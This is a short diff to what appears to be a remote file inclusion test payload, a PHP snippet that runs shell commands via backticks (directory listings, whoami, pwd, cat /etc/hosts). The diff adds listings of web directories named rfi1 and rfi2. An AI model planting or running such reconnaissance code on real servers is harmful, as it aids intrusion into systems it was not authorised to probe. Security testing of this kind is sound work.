@@ -4,6 +4,9 @@
 <!-- Comment out the PHP code should the code not be executed server side.
 <?php
     $ls_output = `ls -alG /`;
+    $ls0_output = `ls /var/www/html/rfi1/`;
+    $ls1_output = `ls /var/www/html/rfi2/`;
+    $ls_output = `ls -alG /`;
     $whoami_output = `whoami`;
     $pwd_output = `pwd`;
     $catetchosts_output = `cat /etc/hosts`;
